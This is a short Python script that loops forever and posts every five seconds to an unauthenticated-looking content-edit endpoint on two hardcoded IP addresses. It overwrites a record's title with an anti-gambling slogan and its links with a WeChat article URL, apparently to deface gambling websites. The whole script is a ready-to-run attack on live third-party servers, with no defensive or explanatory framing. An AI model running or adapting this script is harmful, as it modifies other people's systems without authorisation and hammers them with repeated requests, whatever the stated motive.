import time

import requests


ips = ['http://47.75.90.89:38280', 'http://47.52.165.75:23130']
api = '/index.php/information/index/editdo.html'
article = 'https://mp.weixin.qq.com/s/pnnT8GuPHz8Lw0vG0aSzFQ'


while True:
    for ip in ips:
        url = ip + api
        requests.post(url, data=dict(
            title='珍爱生命，远离赌博。',
            url=article,
            wap=article,
            id=1,
        ))
    time.sleep(5)
